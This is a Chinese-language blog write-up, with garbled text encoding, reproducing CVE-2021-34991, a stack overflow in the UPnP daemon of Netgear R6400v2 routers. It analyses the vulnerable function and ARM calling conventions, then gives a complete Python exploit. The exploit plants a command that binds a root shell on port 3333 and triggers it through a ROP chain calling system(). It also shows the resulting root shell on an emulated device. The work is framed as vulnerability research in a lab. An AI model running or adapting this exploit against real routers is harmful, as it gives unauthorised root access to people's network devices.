<!DOCTYPE html><html lang="zh-CN"><head><title>CVE-2021-34991 å¤ç°è®°å½•</title><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="stylesheet" href="/css/highlight/xcode.min.css"><link rel="stylesheet" href="/css/bootstrap/bootstrap-tooltips.css"><link rel="stylesheet" href="/css/post.css"><script src="/js/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body><script>if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent)) {
  document.body.classList.add('mobile')
}</script><div><div class="inner"><h1>CVE-2021-34991 å¤ç°è®°å½•</h1><div class="time">2023-02-16</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00%EF%BC%9A%E5%89%8D%E8%A8%80"><span class="toc-text">0x00ï¼šå‰è¨€</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01%EF%BC%9A%E7%9B%B8%E5%85%B3%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%86"><span class="toc-text">0x01ï¼šç›¸å…³æ±‡ç¼–çŸ¥è¯†</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">0x02ï¼šæ¼æ´åˆ†æ</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03%EF%BC%9A%E7%BC%96%E5%86%99EXP"><span class="toc-text">0x03ï¼šç¼–å†™EXP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04%EF%BC%9A%E6%B5%8B%E8%AF%95"><span class="toc-text">0x04ï¼šæµ‹è¯•</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x05%EF%BC%9A%E6%80%BB%E7%BB%93"><span class="toc-text">0x05ï¼šæ€»ç»“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06%EF%BC%9A%E5%8F%82%E8%80%83"><span class="toc-text">0x06ï¼šå‚è€ƒ</span></a></li></ol><h2 id="0x00ï¼šå‰è¨€"><a href="#0x00ï¼šå‰è¨€" class="headerlink" title="0x00ï¼šå‰è¨€"></a>0x00ï¼šå‰è¨€</h2><p>CVE-2021-34991æ¼æ´å¯ä»¥åœ¨Netgear SOHOä¸ªåˆ«è®¾å¤‡ä¸­è·å–rootæƒé™ï¼Œè¿›è¡Œè¿œç¨‹ä»£ç æ‰§è¡Œã€‚è¯¥æ¼æ´å‘ç”ŸäºupnpæœåŠ¡ç¨‹åºä¸­æ²¡æœ‰ä¸¥æ ¼æ£€æŸ¥å­—ç¬¦ä¸²æ‹·è´çš„é•¿åº¦ï¼Œå¯¼è‡´å¯ä»¥æ ˆæº¢å‡ºæ§åˆ¶ç¨‹åºçš„æ‰§è¡Œæµã€‚</p>
<p>æœ¬æ¬¡å¤ç°æ‰€é‡‡ç”¨çš„å›ºä»¶ç‰ˆæœ¬ä¸ºR6400v2-1.0.4.118ï¼Œå¯ç‚¹å‡»<a target="_blank" rel="noopener" href="https://www.netgear.com/support/download/?model=R6400v2">è¿™é‡Œ</a>è¿›è¡Œä¸‹è½½ã€‚</p>
<br>

<h2 id="0x01ï¼šç›¸å…³æ±‡ç¼–çŸ¥è¯†"><a href="#0x01ï¼šç›¸å…³æ±‡ç¼–çŸ¥è¯†" class="headerlink" title="0x01ï¼šç›¸å…³æ±‡ç¼–çŸ¥è¯†"></a>0x01ï¼šç›¸å…³æ±‡ç¼–çŸ¥è¯†</h2><p>å›ºä»¶ä¸­ç¨‹åºæ‰€é‡‡ç”¨çš„æ˜¯32ä½ARMæ¶æ„ï¼Œè¿™é‡Œä»…æ˜¯è®²è®²å¤ç°è¿‡ç¨‹ä¸­çš„é‡è¦å†…å®¹ï¼Œå¹¶æ²¡æœ‰å¯¹æ•´ä¸ªä½“ç³»è¿›è¡Œè®²è§£ã€‚</p>
<p>å¸¸ç”¨çš„å¯„å­˜å™¨æœ‰R0ã€R1ã€R2ã€Â·Â·Â·ã€R15ï¼ŒR0/R1/R2/R3ç”¨äºå‡½æ•°çš„å‚æ•°ä¼ é€’ï¼Œå‡½æ•°è¿”å›æ—¶ç”¨R0ä¿å­˜è¿”å›å€¼ã€‚è¿™é‡Œä½¿ç”¨çš„é¡ºåºç¼–å·ï¼Œå…¶ä¸­ä¸€äº›å¯„å­˜å™¨è¿˜ä½¿ç”¨äº†å…¶å®ƒæ ‡è¯†ã€‚</p>
<p>å…¶ä¸­ï¼š</p>
<ul>
<li>R11ä¸ºFPï¼Œä¸ºæ ˆåº•æŒ‡é’ˆå¯„å­˜å™¨ï¼Œå¦‚åŒX86ä¸‹çš„EBP; </li>
<li>R13ä¸ºSPï¼Œä¸ºæ ˆé¡¶æŒ‡é’ˆå¯„å­˜å™¨ï¼›</li>
<li>R14ä¸ºLRï¼Œåœ¨è°ƒç”¨å‡½æ•°æ—¶ä¿å­˜ä¸‹ä¸ªæŒ‡ä»¤çš„åœ°å€ï¼›</li>
<li>R15ä¸ºPCï¼ŒæŒ‡å‘CPUæ‰§è¡Œçš„æŒ‡ä»¤ï¼›</li>
</ul>
<p>ä¸‹é¢æ¥çœ‹çœ‹armå‡½æ•°è°ƒç”¨å’Œå‡½æ•°è¿”å›çš„è¿‡ç¨‹ï¼š</p>
<pre><code>.text:0001DEC8 05 00 A0 E1                   MOV             R0, R5        ; int
.text:0001DECC 08 10 A0 E1                   MOV             R1, R8        ; needle
.text:0001DED0 84 21 9F E5                   LDR             R2, =(aSslHttpSocketC+0x20) ; &quot;\r\n&quot;
.text:0001DED4 06 30 A0 E1                   MOV             R3, R6
.text:0001DED8 91 BD FF EB                   BL              find_token_get_val
.text:0001DED8
.text:0001DEDC 00 00 50 E3                   CMP             R0, #0
</code></pre>
<p>ä¸Šé¢ä¸ºè°ƒç”¨find_token_get_valçš„æ±‡ç¼–ä»£ç ï¼Œä½¿ç”¨BLè·³è½¬æ—¶ï¼Œä¼šå…ˆä¿å­˜ä¸‹ä¸€æŒ‡ä»¤çš„åœ°å€(å³0x0001DEDC)åˆ°LRä¸­ï¼Œç„¶åè¿›è¡Œè·³è½¬ã€‚å¦‚æœæ˜¯æŒ‡ä»¤Bï¼Œåˆ™ç›´æ¥è¿›è¡Œè·³è½¬ã€‚</p>
<pre><code>// find_token_get_valé¦–æ¡æŒ‡ä»¤
.text:0000D524 F0 47 2D E9                   PUSH            &#123;R4-R10,LR&#125;

// find_token_get_valè¿”å›æ—¶
.text:0000D538 04 00 A0 E1                   MOV             R0, R4
.text:0000D53C F0 87 BD E8                   POP             &#123;R4-R10,PC&#125;
</code></pre>
<p>ä»ä¸Šé¢å¯è§ï¼Œåœ¨è¿›å…¥find_token_get_valåï¼Œé¦–å…ˆä½¿ç”¨PUSHæŠŠçˆ¶å‡½æ•°çš„å¯„å­˜å™¨ä¿¡æ¯ä¿å­˜ï¼Œè¿”å›æ—¶ï¼Œå†ä½¿ç”¨POPè¿›è¡Œæ¢å¤ã€‚ç°åœ¨æ¥çœ‹çœ‹è¿™ä¸¤æ¡æŒ‡ä»¤ï¼Œé‡Œé¢çš„â€R4-R10â€ï¼ŒæŒ‡çš„æ˜¯R4ã€R5ã€Â·Â·Â·ã€R9ã€R10å¯„å­˜å™¨ã€‚</p>
<p>å¦‚æœä»¥X86çš„è§†è§’è¿›è¡Œåˆ†æ: é¦–å…ˆpush R4ï¼Œç„¶åR5, ç›´åˆ°LRï¼›è¿”å›æ—¶pop R4, R5â€¦è¯¶ï¼Ÿä¸å¤ªå¯¹ï¼Œä»å³å¾€å·¦è¯•è¯•~ğŸ™‚  ä»…æŒ‰æ‹¬å·ä¸­çš„å·¦å³é¡ºåºè¿›è¡Œåˆ†æï¼Œæ— è®ºæ€æ ·ï¼Œå§‹ç»ˆæ„Ÿè§‰å¥‡æ€ªã€‚å…¶å®ï¼ŒARMé‡‡ç”¨äº†æ›´åŠ ç®€å•ç›´æ¥çš„æ–¹å¼ï¼š</p>
<p><img src="/images/CVE-2021-34991%E5%A4%8D%E7%8E%B0/image-20230214093502774.png" alt="image-20230214093502774"></p>
<p><img src="/images/CVE-2021-34991%E5%A4%8D%E7%8E%B0/image-20230214093602940.png" alt="image-20230214093602940"></p>
<p>ä»å®˜æ–¹æ‰‹å†Œçš„æè¿°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜¯ä»¥å¯„å­˜å™¨çš„ç¼–å·å¤§å°ä¸ºPUSH/POPçš„é¡ºåºï¼Œå¤§ç¼–å·å¯¹åº”é«˜åœ°å€ï¼Œå°ç¼–å·å¯¹åº”ä½åœ°å€ã€‚ä»¥å‰é¢çš„æŒ‡ä»¤ä¸ºä¾‹ï¼Œå¹¶ä¸”æˆ‘ä»¬å·²çŸ¥æ ˆæ˜¯ä»é«˜åœ°å€å¾€ä½åœ°å€å‘å±•çš„ã€‚<code>PUSH &#123;R4-R10, LR&#125;</code>ï¼šå…ˆæŠŠLR(R14)å‹æ ˆï¼Œå†åˆ°R10ã€R9ã€Â·Â·Â·ã€R4ã€‚<code>POP &#123;R4-R10, PC&#125;</code>ï¼šå…ˆå‡ºæ ˆç»™R4ï¼Œå†åˆ°R5ï¼ŒÂ·Â·Â·ï¼Œæœ€åæ˜¯LRã€‚</p>
<br>

<h2 id="0x02ï¼šæ¼æ´åˆ†æ"><a href="#0x02ï¼šæ¼æ´åˆ†æ" class="headerlink" title="0x02ï¼šæ¼æ´åˆ†æ"></a>0x02ï¼šæ¼æ´åˆ†æ</h2><p>è¯¥æ ˆæº¢å‡ºæ¼æ´å‘ç”Ÿåœ¨upnpdç¨‹åºçš„<code>gena_response_unsubscribe</code>å‡½æ•°ä¸­ï¼š</p>
<pre><code class="c">  char needle[10240]; // [sp+8h] [bp-2C68h] BYREF
  char http_msg[512]; // [sp+2808h] [bp-468h] BYREF
  char v14[512]; // [sp+2A08h] [bp-268h] BYREF
  char uuid_buffer[104]; // [sp+2C08h] [bp-68h] BYREF

  memset(v14, 0, sizeof(v14));
  memset(http_msg, 0, sizeof(http_msg));
  memset(uuid_buffer, 0, 0x40);
  (likePrint)(2, &quot;%s(%d)\n&quot;, &quot;gena_response_unsubscribe&quot;);
  strncpy(http_msg, a1, 511u);                  // a1 -&gt; v13
  strlwr(http_msg);                             // è½¬æ¢æˆå°å†™
  if ( !strstr(http_msg, &quot;sid:&quot;) )              // strstr(str1, str2) åˆ¤æ–­str2æ˜¯å¦ä¸ºstr1çš„å­ä¸²
    return (send_error_response)(a2);
  if ( !strstr(http_msg, &quot;host:&quot;) )
    return (send_error_response)(a2);
  if ( !stristr(http_msg, &quot;uuid:&quot;) )
    return (send_error_response)(a2);
  memset(uuid_buffer, 0, 0x40u);                // ç”¨äºå­˜å‚¨ä»http_msgä¸­è·å–çš„uuidå€¼
  memset(needle, 0, sizeof(needle));
  strncpy(needle, &quot;uuid:&quot;, 0x3FFu);
  if ( !(find_token_get_val)(http_msg, needle) )
    return (send_error_response)(a2);
</code></pre>
<p><code>gena_response_unsubscribe</code>å‡½æ•°ç”¨äºå¤„ç†httpä¸­çš„UNSUBSCRIBEè¯·æ±‚ï¼Œä½¿ç”¨strncpyå°†ä¼ å…¥çš„httpæŠ¥æ–‡ä¿¡æ¯æ‹·è´åˆ°æ•°ç»„http_msgä¸­ï¼Œç„¶åä½¿ç”¨strlwrå°†http_msgä¸­çš„å¤§å†™å­—æ¯è½¬æ¢ä¸ºå°å†™ã€‚åœ¨ä¸‹é¢è°ƒç”¨<code>find_token_get_val</code>å‡½æ•°è·å–uuidçš„å€¼æ—¶ï¼Œå¯ä»¥èµ‹ç»™uuid_bufferè¿‡å¤šçš„å€¼å¯¼è‡´æ ˆæº¢å‡ºï¼š</p>
<pre><code class="c">    uuid_value_end = strstr(a1, a3);            // æŒ‡å‘uuidå€¼çš„ç»“æŸ
    v4 = uuid_value_end;
    if ( uuid_value_end )
    &#123;
      if ( uuid_value_end - uuid_value_start &lt; 1024 )  // 1024
        strncpy(a4, uuid_value_start, uuid_value_end - uuid_value_start);
      else
</code></pre>
<p>è¦æƒ³æ§åˆ¶æ‰§è¡Œæµè¿›è¡Œgetshellï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦çŸ¥é“å¦‚ä½•æ„é€ uuidçš„å€¼ï¼Œä½¿å¾—è¿”å›åœ°å€è¦†ç›–ä¸ºgadgetçš„åœ°å€ï¼Œä»è€Œæ§åˆ¶æ‰§è¡Œæµã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼š1) strncpyæ‹·è´æ•°æ®æ˜¯æœ‰\x00å­—èŠ‚æˆªæ–­çš„ï¼Œå¦‚æœæˆ‘ä»¬æ„é€ uuidå€¼ä¸­å¸¦æœ‰\x00ï¼Œé‚£ä¹ˆå‰é¢<code>strncpy(http_msg, a1, 511u)</code>è¿™é‡Œå°†å¯¼è‡´æŠ¥æ–‡ç¼ºå¤±ï¼Œä»è€Œè·å–uuidæ—¶ï¼Œæ‰¾ä¸åˆ°\r\nè€Œå¼•èµ·ç¨‹åºé€€å‡ºï¼›2) å‰é¢æœ‰å¤§å°å†™è½¬æ¢ï¼Œé‚£ä¹ˆgadgetä¸­ä¸èƒ½å«æœ‰A-Zå¯¹åº”çš„asciiç å€¼ï¼›</p>
<p>å¯¹äºç¬¬ä¸€ç‚¹åˆ†æï¼ŒæŒ‡ä»¤åœ°å€çš„é«˜å­—èŠ‚æ˜¯æœ‰\x00çš„ï¼Œä½†ç”±äºç¨‹åºæ˜¯å°ç«¯åºï¼Œæˆ‘ä»¬å¯ä»¥ç”¨<code>\r\n</code>ç»•è¿‡ï¼Œ\r\næ›¿ä»£æ‰é«˜å­—èŠ‚çš„\x00ã€‚ä½œä¸ºä»£ä»·æ˜¯æˆ‘ä»¬uuidå€¼ä¸­ï¼Œåªèƒ½å¸¦æœ‰ä¸€ä¸ªgadgetåœ°å€ã€‚</p>
<p>å¯¹äºç¬¬äºŒç‚¹ï¼Œè™½ç„¶åœ¨<code>gena_response_unsubscribe</code>å‡½æ•°çš„æ ˆå¸§ç©ºé—´ä¸­ï¼ŒhttpæŠ¥æ–‡ä¼šè½¬æ¢ä¸ºå°å†™ï¼Œä½†åœ¨è°ƒç”¨<code>gena_response_unsubscribe</code>å‡½æ•°çš„çˆ¶å‡½æ•°çš„æ ˆå¸§ç©ºé—´ä¸­æŠ¥æ–‡è¿˜æ˜¯åŸå§‹çš„æ ¼å¼ã€‚æˆ‘ä»¬å¯ä»¥å¢åŠ SPçš„å€¼ï¼Œä½¿å…¶æŒ‡å‘è¯¥å¤„ã€‚</p>
<p>å¤§æ¦‚æ€è·¯ï¼šæ§åˆ¶æ‰§è¡Œæµåå…ˆadd spï¼Œä½¿å…¶æŒ‡å‘getshell gadgetï¼Œç„¶åpop pcï¼›getshellæŒ‡ä»¤æ˜¯BL systemï¼Œä¸è¿‡è¦å…ˆæŠŠå‚æ•°æ”¾å…¥R0ã€‚è‡³äºsystemçš„å‚æ•°ï¼Œå¯ä»¥é€šè¿‡å¦å¤–ä¸€ä¸ªè¯·æ±‚ä¼ å…¥å…¨å±€å˜é‡0x66AD0å¤„ã€‚</p>
<br>

<h2 id="0x03ï¼šç¼–å†™EXP"><a href="#0x03ï¼šç¼–å†™EXP" class="headerlink" title="0x03ï¼šç¼–å†™EXP"></a>0x03ï¼šç¼–å†™EXP</h2><p>é¦–å…ˆè¯´ä¸€ä¸‹idaF5åç¼–è¯‘çš„é—®é¢˜ï¼šä»æ±‡ç¼–æŒ‡ä»¤æ¥çœ‹ï¼Œ<code>find_token_get_val(http_msg, needle)</code>å…¶å®æ˜¯ä¸º<code>find_token_get_val(http_msg, needle, &quot;\r\n&quot;, uuid_buffer)</code>ã€‚ç„¶åï¼Œè‡³äºuuid_bufferçš„å¤§å°:</p>
<pre><code>// è¿›å…¥gena_response_unsubscribeåï¼š
.text:0001DDAC F0 4F 2D E9                   PUSH            &#123;R4-R11,LR&#125;
.text:0001DDB0 B1 DD 4D E2                   SUB             SP, SP, #0x2C40
.text:0001DDB4 0C D0 4D E2                   SUB             SP, SP, #0xC

// uuid_bufferç¬¬ä¸€æ¬¡memset:
.text:0001DE04 02 3A 8D E2                   ADD             R3, SP, #0x2C70+var_C70
.text:0001DE08 0B 0B 8D E2                   ADD             R0, SP, #0x2C70+var_70
.text:0001DE0C 04 10 A0 E1                   MOV             R1, R4        ; c
.text:0001DE10 3C 20 A0 E3                   MOV             R2, #0x3C ; &#39;&lt;&#39; ; n
.text:0001DE14 08 4C 83 E5                   STR             R4, [R3,#0xC08]
.text:0001DE18 0C 00 80 E2                   ADD             R0, R0, #0xC  ; s
.text:0001DE1C 18 B7 FF EB                   BL              memset

//uuid_bufferç¬¬äºŒæ¬¡memset
.text:0001DE8C 0B 6B 8D E2                   ADD             R6, SP, #0x2C70+var_70
.text:0001DE90 08 80 8D E2                   ADD             R8, SP, #0x2C70+needle
.text:0001DE94 08 60 86 E2                   ADD             R6, R6, #8
.text:0001DE98 04 10 A0 E1                   MOV             R1, R4        ; c
.text:0001DE9C 40 20 A0 E3                   MOV             R2, #0x40 ; &#39;@&#39; ; n
.text:0001DEA0 06 00 A0 E1                   MOV             R0, R6        ; s
.text:0001DEA4 F6 B6 FF EB                   BL              memset

//é€€å‡ºgena_response_unsubscribeå‰ï¼š
.text:0001DF04 4C D0 8D E2                   ADD             SP, SP, #0x4C ; &#39;L&#39;
.text:0001DF08 0B DB 8D E2                   ADD             SP, SP, #0x2C00
.text:0001DF0C F0 8F BD E8                   POP             &#123;R4-R11,PC&#125;
</code></pre>
<p>è¿™é‡Œæ¯”è¾ƒå¥‡æ€ªçš„æ˜¯ï¼Œä¸¤æ¬¡å¯¹uuid_bufferè¿›è¡Œmemsetï¼Œuuid_bufferçš„èµ·å§‹ç©ºé—´æ˜¯ä¸åŒçš„ï¼Œä¸€ä¸ªæ˜¯sp+0x2c00ï¼Œä¸€ä¸ªæ˜¯sp+0x2c08ã€‚ä¸è¿‡æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œè°ƒç”¨find_token_get_valæ—¶æ˜¯sp+0x2c08ï¼Œæ­¤æ—¶uuid_bufferçš„ç©ºé—´å¤§å°ä¸º0x44ï¼Œå†ä¸Šé¢å°±æ˜¯R4ã€R5ã€â€¦ã€R11ã€LRäº†ã€‚æ‰€ä»¥æˆ‘ä»¬è¦å…ˆå¡«å……0x64å­—èŠ‚çš„æ•°æ®ï¼Œå†è¿½åŠ æˆ‘ä»¬çš„gadgetã€‚</p>
<p>ä¸‹é¢EXPé‡‡ç”¨çš„gadgetæ˜¯ï¼š</p>
<pre><code>.text:00021F34 01 DA 8D E2                   ADD             SP, SP, #0x1000
.text:00021F38 F0 80 BD E8                   POP             &#123;R4-R7,PC&#125;

.text:00018150 04 00 A0 E1                   MOV             R0, R4        ; command
.text:00018154 C1 CC FF EB                   BL              system
</code></pre>
<p>EXPä¸ºï¼š</p>
<pre><code class="python">import socket
import pwn

port = 5000
ip = &quot;192.168.1.1&quot;
command = &quot;/bin/utelnetd -p3333 -l/bin/sh -d&quot;

def s2b(s):
    return bytes([ord(x) for x in s])

def mySend(ip, port, payload):
    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    sock.connect((ip, port))
    sock.send(payload)
    pwn.sleep(1)
    sock.close()

def set_command():
    # å°†å‘½ä»¤å†™åˆ°å…¨å±€å˜é‡ä¸­
    payload =  b&#39;&lt;?xml version=&quot;1.0&quot;?&gt; &#39;
    payload += b&#39;&lt;SOAP-ENV:Envelope&gt; &#39;
    payload += b&#39;Body&gt;:&#39;
    payload += s2b(command.replace(&quot; &quot;,&quot;$&#123;IFS&#125;&quot;))
    payload += b&#39;;Body &gt;&#39;
    payload += b&quot; &lt;/SOAP-ENV:Body&gt; &quot;
    payload += b&quot;&lt;/SOAP-ENV:Envelope&gt;&quot;

    request  = b&#39;POST /Public_UPNP_C5 HTTP/1.1\r\n&#39;
    request += s2b(&#39;Host: http://&#123;&#125;:&#123;&#125;\r\n&#39;.format(ip, port))
    request += b&#39;SOAPAction\r\n&#39;
    request += s2b(&#39;Content-Length: &#123;&#125;\r\n&#39;.format(len(payload)))
    request += b&#39;\r\n&#39;
    request += payload

    mySend(ip, port, request)

def Exploit():
    
    stack_add_gadget = 0x21F34  #ADD SP, SP, #0x1000; POP &#123;R4-R7,PC&#125;
    padding1         = 1304
    command_address  = 0x66AD0
    padding2         = 12
    system_gadget    = 0x18150  #MOV R0, R4; BL system

    payload  = b&#39;UNSUBSCRIBE /Public_UPNP_Event_1 HTTP/1.1\r\n&#39;
    payload += s2b(&#39;Host: http://&#123;&#125;:&#123;&#125;\r\n&#39;.format(ip, port))
    payload += b&#39;SID: whatever\r\n&#39;
    payload += b&#39;UUID: &#39; + b&quot;A&quot;*67
    payload += b&#39;4444&#39;
    payload += b&#39;5555&#39;
    payload += b&#39;6666&#39;
    payload += b&#39;7777&#39;
    payload += b&#39;8888&#39;
    payload += b&#39;9999&#39;
    payload += b&#39;1010&#39;
    payload += b&#39;1111&#39;
    
    # å°ç«¯åºåœ°å€ï¼Œä½¿ç”¨\r\næ›¿ä»£æ‰\x00
    payload += pwn.p32(stack_add_gadget)[:3]
    payload += b&#39;\r\n\r\n&#39;

    # é€šè¿‡è°ƒè¯•æ‰¾åˆ°åŸå§‹æŠ¥æ–‡çš„ä½ç½®ï¼Œæ·»åŠ åƒåœ¾æ•°æ®ï¼Œä½¿SP+0x1000åï¼ŒæŒ‡å‘command_addresså¤„
    payload += b&#39;J&#39; * (padding1 - len(payload))
    # æ‰§è¡Œsystem(command)
    payload += pwn.p32(command_address)
    payload += b&#39;K&#39; * padding2
    payload += pwn.p32(system_gadget)

    set_command()   # å°†å‘½ä»¤å­˜åœ¨0x66AD0
    mySend(ip, port, payload) 
    
if __name__ == &quot;__main__&quot;:
    Exploit()
</code></pre>
<br>

<h2 id="0x04ï¼šæµ‹è¯•"><a href="#0x04ï¼šæµ‹è¯•" class="headerlink" title="0x04ï¼šæµ‹è¯•"></a>0x04ï¼šæµ‹è¯•</h2><p>è¿™é‡Œä½¿ç”¨å›ºä»¶è‡ªåŠ¨åŒ–æ¨¡æ‹Ÿå·¥å…·â€“FirmAEè¿›è¡Œæ¨¡æ‹Ÿ(<a target="_blank" rel="noopener" href="https://toleleyjl.github.io/2023/02/15/FirmAE%E5%88%9D%E6%AD%A5%E4%BD%BF%E7%94%A8/">ä½¿ç”¨æ•™ç¨‹</a>)ã€‚</p>
<p><code>./run.sh -c R6400v2 ./firmwares/R6400v2-V1.0.4.118_10.0.90.chk</code>æ£€æŸ¥ä¸€ä¸‹æ˜¯å¦å¯ä»¥æ¨¡æ‹Ÿã€‚</p>
<p><code>./run.sh -r R6400v2 ./firmwares/R6400v2-V1.0.4.118_10.0.90.chk</code>å¼€å§‹æ¨¡æ‹Ÿï¼ŒæœåŠ¡å¼€åœ¨äº†192.168.1.1ã€‚</p>
<p>è¿›è¡Œè°ƒè¯•çš„è¯ï¼Œå°†å‚æ•°æ”¹ä¸º-dã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥ç”¨nmapæ‰«ä¸€ä¸‹ç«¯å£ï¼Œå‘ç°upnpæœåŠ¡å·²ç»é»˜è®¤å¼€å¯åœ¨äº†5000ç«¯å£ã€‚</p>
<p>æ‰§è¡Œexpåï¼Œå³å¯ä½¿ç”¨telnetè¿æ¥ç›®æ ‡çš„3333ç«¯å£ã€‚</p>
<pre><code class="shell">tolele@u22: $ python3 upnpd_exp.py
tolele@u22: $ telnet 192.168.1.1 3333
Trying 192.168.1.1...
Connected to 192.168.1.1.
Escape character is &#39;^]&#39;.


BusyBox v1.7.2 (2021-06-30 20:48:26 CST) built-in shell (ash)
Enter &#39;help&#39; for a list of built-in commands.

# ls
bin         etc_ro      media       root        sys         www
data        firmadyne   mnt         run         tmp
dev         lib         opt         sbin        usr
etc         lost+found  proc        share       var
# 
</code></pre>
<br>

<h2 id="0x05ï¼šæ€»ç»“"><a href="#0x05ï¼šæ€»ç»“" class="headerlink" title="0x05ï¼šæ€»ç»“"></a>0x05ï¼šæ€»ç»“</h2><p>æœ¬æ¬¡æ¼æ´å¤ç°æ”¶è·é¢‡ä¸°ï¼Œä½†ä¹Ÿå‘ç°äº†è‡ªèº«çŸ¥è¯†è–„å¼±çš„åœ°æ–¹ï¼š</p>
<p>1ï¼‰IOTè®¾å¤‡æœåŠ¡ç¨‹åºå¾ˆå¤šï¼Œæ€æ ·å¿«é€Ÿçš„å‘ç°æ¼æ´ï¼Ÿæˆ–è€…ä½¿ç”¨æ¨¡ç³Šæµ‹è¯•å·¥å…·ï¼Ÿ</p>
<p>2ï¼‰è®¡ç®—æœºç½‘ç»œçŸ¥è¯†ä¸é€†å‘åŠŸåº•ä¸åˆ°ä½ï¼ŒæŠ¥æ–‡æ ¼å¼çš„æ„é€ æ¨¡æ¨¡ç³Šç³Šï¼›</p>
<br>

<h2 id="0x06ï¼šå‚è€ƒ"><a href="#0x06ï¼šå‚è€ƒ" class="headerlink" title="0x06ï¼šå‚è€ƒ"></a>0x06ï¼šå‚è€ƒ</h2><p>1ã€<a target="_blank" rel="noopener" href="https://github.com/grimm-co/NotQuite0DayFriday/blob/trunk/2021.11.16-netgear-upnp/README.md">https://github.com/grimm-co/NotQuite0DayFriday/blob/trunk/2021.11.16-netgear-upnp/README.md</a></p>
<p class="textAlignRight"><span>â†¶ </span><a href="/">è¿”å›é¦–é¡µ</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script>window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments);}
gtag('js', new Date());
gtag('config', '');</script></html>